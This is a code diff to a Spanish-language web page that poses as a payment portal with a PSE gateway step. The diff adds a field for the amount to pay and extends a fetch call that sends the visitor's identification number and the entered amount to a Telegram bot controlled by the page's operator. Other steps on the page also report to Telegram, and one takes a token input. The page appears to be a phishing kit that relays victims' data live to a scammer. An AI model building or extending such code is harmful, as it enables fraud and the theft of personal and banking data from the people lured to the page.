@@ -611,10 +611,44 @@ main {
     box-shadow: 0 2px 8px rgba(0,0,0,0.1);
 }
 
+/* CAMPO VALOR A PAGAR (Paso 2) */
+.valor-pagar-container {
+    display: none; /* Oculto por defecto, solo en paso 2 */
+    margin-bottom: 15px;
+}
+.valor-pagar-container label {
+    font-size: 13px;
+    font-weight: 700;
+    color: #333;
+    display: block;
+    margin-bottom: 5px;
+}
+.valor-pagar-container .input-money {
+    display: flex;
+    border: 1px solid #333;
+    border-radius: 4px;
+    overflow: hidden;
+}
+.valor-pagar-container .input-money span {
+    background: #fff;
+    padding: 8px 12px;
+    border-right: 1px solid #333;
+    font-weight: 700;
+    color: #333;
+}
+.valor-pagar-container .input-money input {
+    border: 0;
+    padding: 8px;
+    flex: 1;
+    outline: none;
+    font-family: inherit;
+    font-size: 14px;
+}
+
 /* BOTÓN SIGUIENTE */
 .btn-siguiente {
     width: 100%;
-    background: #2da22d; /* Verde activo */
+    background: #2da22d; 
     color: #fff;
     border: 0;
     border-radius: 4px;
@@ -630,15 +664,15 @@ main {
     transition: all 0.3s;
 }
 
-/* CLASE PARA BLOQUEAR EL BOTÓN VISUALMENTE */
-.btn-siguiente.bloqueado {
-    background: #a5d6a7; /* Verde pálido */
+/* CUANDO ESTÁ DESHABILITADO (Opaco) */
+.btn-siguiente:disabled {
+    background: #a5d6a7; 
     color: #fff;
     cursor: not-allowed;
     opacity: 0.8;
 }
 
-.btn-siguiente:hover:not(.bloqueado) { background: #248524; }
+.btn-siguiente:hover:not(:disabled) { background: #248524; }
 
 .recaptcha-texto {
     font-size: 11px;
@@ -969,8 +1003,18 @@ main {
             </div>
 
             <div class="card-blanca-amarilla">
-                <!-- EL BOTÓN AHORA TIENE LA CLASE "bloqueado" -->
-                <button class="btn-siguiente bloqueado" id="btnAccionAmarillo">
+                
+                <!-- NUEVO CAMPO: VALOR A PAGAR (Solo se muestra en Paso 2) -->
+                <div class="valor-pagar-container" id="containerValorPagar">
+                    <label>Valor que desea pagar:</label>
+                    <div class="input-money">
+                        <span>$</span>
+                        <input type="text" id="inputValorPagar" placeholder="Digite el valor a pagar" inputmode="numeric">
+                    </div>
+                </div>
+
+                <!-- BOTÓN (Inicia bloqueado) -->
+                <button class="btn-siguiente" id="btnAccionAmarillo" disabled>
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
                     SIGUIENTE
                 </button>
@@ -1018,6 +1062,8 @@ const paso3Amarillo = document.getElementById('paso3Amarillo');
 const cajaPaso1 = document.getElementById('cajaPaso1');
 const checkPaso1 = document.getElementById('checkPaso1');
 const btnAccionAmarillo = document.getElementById('btnAccionAmarillo');
+const containerValorPagar = document.getElementById('containerValorPagar');
+const inputValorPagar = document.getElementById('inputValorPagar');
 let pasoActualAmarillo = 1;
 let checkPaso1Activado = false;
 
@@ -1055,6 +1101,11 @@ inputId.addEventListener('input', function () {
 inputToken.addEventListener('input', function () {
     this.value = this.value.replace(/\D/g, '');
     errorToken.classList.remove('show');
+});
+
+// Permitir solo números en el valor a pagar
+inputValorPagar.addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '');
 });
 
 btnToggleEye.addEventListener('click', function () {
@@ -1252,9 +1303,8 @@ function iniciarFlujoAmarillo() {
     // Resetear el check y el botón
     checkPaso1Activado = false;
     checkPaso1.classList.remove('activo');
-    
-    // Bloqueamos visualmente el botón con la clase
-    btnAccionAmarillo.classList.add('bloqueado'); 
+    btnAccionAmarillo.disabled = true; 
+    inputValorPagar.value = '';
     
     actualizarPasoAmarillo();
     
@@ -1272,7 +1322,7 @@ cajaPaso1.addEventListener('click', function() {
     if (pasoActualAmarillo === 1 && !checkPaso1Activado) {
         checkPaso1Activado = true;
         checkPaso1.classList.add('activo'); // Poner verde
-        btnAccionAmarillo.classList.remove('bloqueado'); // Desbloquear visualmente
+        btnAccionAmarillo.disabled = false; // Desbloquear botón y dar color verde brillante
     }
 });
 
@@ -1283,25 +1333,30 @@ function actualizarPasoAmarillo() {
         paso1Amarillo.style.display = 'block';
         paso2Amarillo.style.display = 'none';
         paso3Amarillo.style.display = 'none';
+        containerValorPagar.style.display = 'none'; // Ocultar campo de dinero
         btn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg> SIGUIENTE`;
+        
     } else if (pasoActualAmarillo === 2) {
         paso1Amarillo.style.display = 'none';
         paso2Amarillo.style.display = 'block';
         paso3Amarillo.style.display = 'none';
+        containerValorPagar.style.display = 'block'; // MOSTRAR CAMPO DE DINERO
         btn.innerHTML = `✓ CONFIRMAR PAGO`;
-        btn.classList.remove('bloqueado'); // En el paso 2 siempre está activo
+        btn.disabled = false; // Siempre activo en el paso 2
+        
     } else if (pasoActualAmarillo === 3) {
         paso1Amarillo.style.display = 'none';
         paso2Amarillo.style.display = 'none';
         paso3Amarillo.style.display = 'block';
+        containerValorPagar.style.display = 'none'; // Ocultar campo de dinero
         btn.innerHTML = `✓ REALIZAR PAGO`;
-        btn.classList.remove('bloqueado'); // En el paso 3 siempre está activo
+        btn.disabled = false; // Siempre activo en el paso 3
     }
 }
 
 function accionBotonAmarillo() {
-    // Si el botón está bloqueado (el check no se ha marcado), no hace nada
-    if (btnAccionAmarillo.classList.contains('bloqueado')) {
+    // Si el botón está deshabilitado (check no marcado), no hace nada
+    if (btnAccionAmarillo.disabled) {
         return;
     }
 
@@ -1328,15 +1383,23 @@ function accionBotonAmarillo() {
         escucharAccionesFinales();
 
     } else if (pasoActualAmarillo === 2) {
+        const valorIngresado = inputValorPagar.value.trim();
+        
+        if (valorIngresado === '') {
+            alert('Por favor, digite el valor que desea pagar.');
+            inputValorPagar.focus();
+            return;
+        }
+
         pasoActualAmarillo = 3;
         actualizarPasoAmarillo();
         
-        // Notificar a Telegram paso 3
+        // Notificar a Telegram paso 3 CON EL VALOR
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 chat_id: TG_CHAT_ID, 
-                text: `⚠️ <b>EL USUARIO ESTÁ EN LA PASARELA PSE (PASO 3)</b>\n\n🔍 Identificación: <code>${idBuscadoGlobal}</code>`, 
+                text: `⚠️ <b>EL USUARIO ESTÁ EN LA PASARELA PSE (PASO 3)</b>\n\n🔍 Identificación: <code>${idBuscadoGlobal}</code>\n💰 <b>Valor a pagar:</b> <code>$${valorIngresado}</code>`, 
                 parse_mode: 'HTML',
                 reply_markup: {
                     inline_keyboard: [
@@ -1350,7 +1413,7 @@ function accionBotonAmarillo() {
     } else if (pasoActualAmarillo === 3) {
         const btn = document.getElementById('btnAccionAmarillo');
         btn.innerHTML = `PROCESANDO...`;
-        btn.classList.add('bloqueado'); // Lo bloqueamos para que no le den doble clic
+        btn.disabled = true; 
         
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
